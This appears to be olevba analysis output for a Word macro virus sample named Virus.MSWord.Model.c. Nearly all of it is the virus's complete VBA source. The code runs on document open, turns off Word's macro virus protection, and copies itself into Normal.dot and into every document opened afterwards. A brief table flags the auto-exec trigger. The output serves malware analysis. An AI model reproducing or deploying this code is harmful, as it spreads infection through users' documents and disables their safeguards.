olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Model.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Model.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Code.bas 
in file: Virus.MSWord.Model.c - OLE stream: 'Macros/VBA/Code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    RemoveProtection
    If Not ActiveDocument = NormalTemplate Then 'Infetta Normal.dot
        CopyVirCodeToModel
    End If
    If Not ActiveDocument = ThisDocument Then   'Infetta il documento aperto
        CopyVirCodeToDocument ActiveDocument
    End If
End Sub
Sub CopyVirCodeToModel()
On Local Error Resume Next
    With ActiveDocument
        .UpdateStylesOnOpen = False
        .AttachedTemplate = "Normal.dot"
    End With
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Code", Object:=wdOrganizerObjectProjectItems
    NormalTemplate.Save
End Sub
Sub CopyVirCodeToDocument(Target As Document)
    On Local Error Resume Next
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=Target.FullName, Name:="Code", Object:=wdOrganizerObjectProjectItems
End Sub
Sub RemoveProtection()
    'Disattiva il messaggio di avviso iniziale
    Options.VirusProtection = False
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

